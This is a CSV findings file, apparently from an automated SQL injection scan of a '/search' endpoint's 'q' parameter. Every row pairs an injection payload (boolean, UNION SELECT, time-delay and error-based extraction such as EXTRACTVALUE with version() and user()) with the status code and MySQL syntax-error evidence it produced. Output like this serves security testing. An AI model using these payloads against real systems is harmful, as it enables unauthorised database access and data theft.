Type,Vulnerability,Endpoint,Method,Parameter,Status Code,Severity,Payload,Evidence
SQL Injection,Boolean-based Blind SQLi,/search,GET,q,200,Medium,1 OR 1=1,응답 내용 변화 감지
SQL Injection,Boolean-based Blind SQLi,/search,GET,q,200,Medium,1 OR 1=1--,응답 내용 변화 감지
SQL Injection,Boolean-based Blind SQLi,/search,GET,q,200,Medium,1 OR 1=1#,응답 내용 변화 감지
SQL Injection,Boolean-based Blind SQLi,/search,GET,q,200,Medium,1 AND 1=2,응답 내용 변화 감지
SQL Injection,Boolean-based Blind SQLi,/search,GET,q,200,Medium,"1 UNION SELECT 1,2,3--",응답 내용 변화 감지
SQL Injection,Boolean-based Blind SQLi,/search,GET,q,200,Medium,"1 UNION SELECT 1,2,3,4,5--",응답 내용 변화 감지
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1' OR '1'='1'--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1' OR 1=1--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1' AND 1=2--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1' OR SLEEP(5)--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1'; SELECT SLEEP(5)--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1' OR pg_sleep(5)--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1'; SELECT pg_sleep(5)--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1'; WAITFOR DELAY '00:00:05'--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1'; WAITFOR DELAY '0:0:5'--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,1' UNION SELECT NULL--," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' UNION SELECT NULL,NULL--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' UNION SELECT NULL,NULL,NULL--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' UNION SELECT 1,2,3--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' UNION SELECT user(),database(),version()--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/search,GET,q,400,High,"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"," error</h2><pre>(1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
